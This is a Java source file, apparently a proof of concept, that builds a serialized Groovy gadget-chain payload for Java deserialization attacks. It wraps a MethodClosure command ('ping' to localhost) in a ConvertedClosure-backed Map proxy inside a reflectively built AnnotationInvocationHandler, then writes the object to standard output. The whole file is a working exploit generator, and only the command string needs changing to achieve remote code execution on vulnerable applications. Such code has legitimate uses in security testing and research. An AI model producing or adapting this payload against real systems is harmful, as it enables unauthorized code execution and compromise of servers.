import java.io.*;
import java.util.Map;
import java.lang.reflect.*;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

public class ProxyChained
{
	public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException 
	{
		Object exp = exploit();
		toByteArray(exp);
	}

	public static void toByteArray(Object object) throws IOException 
	{
		PrintStream out = System.out;
		final ObjectOutputStream pay = new ObjectOutputStream(out);
		pay.writeObject(object);
	}

	public static Object exploit() throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException 
	{
		MethodClosure method = new MethodClosure("ping -n 4 127.0.0.1", "execute");
		ConvertedClosure handler = new ConvertedClosure(method, "entrySet");

		Map map = (Map) Proxy.newProxyInstance(ProxyChained.class.getClassLoader(), new Class[] {Map.class}, handler);

		String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";

		Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
		constructor.setAccessible(true);

		InvocationHandler pay = (InvocationHandler) constructor.newInstance(Override.class, map);

		return pay;
	}

}
